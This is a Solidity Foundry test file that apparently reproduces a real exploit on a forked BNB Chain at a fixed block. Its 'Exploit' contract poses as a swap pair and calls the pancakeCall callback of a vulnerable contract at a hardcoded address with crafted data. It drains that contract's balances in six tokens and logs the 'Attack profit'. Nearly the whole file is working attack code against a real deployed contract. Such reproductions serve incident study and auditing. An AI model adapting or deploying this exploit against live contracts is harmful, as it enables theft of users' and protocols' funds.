pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./interfaces/Cheatcodes.sol";
import "./interfaces/IERC20.sol";

interface IPancakeCallee {
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

contract Exploit {
    address public _token0;


    function token0() public view returns(address){ 
        return _token0;
    }
   
    function token1() public view returns(address){ 
        return _token0;
    }

    function Statr() public {
        address[] memory Token = new address[](6); 
        Token[0] = 0x55d398326f99059fF775485246999027B3197955;
        Token[1] = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        Token[2] = 0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56;
        Token[3] = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
        Token[4] = 0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c;
        Token[5] = 0x2170Ed0880ac9A755fd29B2688956BD959F933F8;
     
        for(uint i = 0; i < Token.length; i++ ){
            uint _amout0 = IERC20(Token[i]).balanceOf(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d);
            _token0 = Token[i];
            IPancakeCallee(0x64dD59D6C7f09dc05B472ce5CB961b6E10106E1d).pancakeCall(address(this), _amout0, 0, abi.encodePacked(bytes12(0),bytes20(address(this)),bytes32(0), bytes32(0)));
        }

    }
    
     function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) public {
 
     }

    fallback() external payable{}


}

contract test is Test{
    Exploit internal exploit;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 21297409);
    }
    
    function testExploit() public {
        exploit = new Exploit();
        exploit.Statr();
        verify();
    }
   
   function verify() public {
   console.log("============== Attack profit: ==============");
   console.log("~", IERC20(0x55d398326f99059fF775485246999027B3197955).balanceOf(address(exploit)) / 1e18 ,"USDT");
   console.log("~", IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c).balanceOf(address(exploit)) / 1e18,"WBNB");
   console.log("~", IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d).balanceOf(address(exploit)) / 1e18,"BUSD");
   console.log("~ 0.0", IERC20(0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c).balanceOf(address(exploit)) / 1e15,"BTCB");
   console.log("~ 0.0", IERC20(0x2170Ed0880ac9A755fd29B2688956BD959F933F8).balanceOf(address(exploit)) / 1e15,"ETH");                                           
  }
}
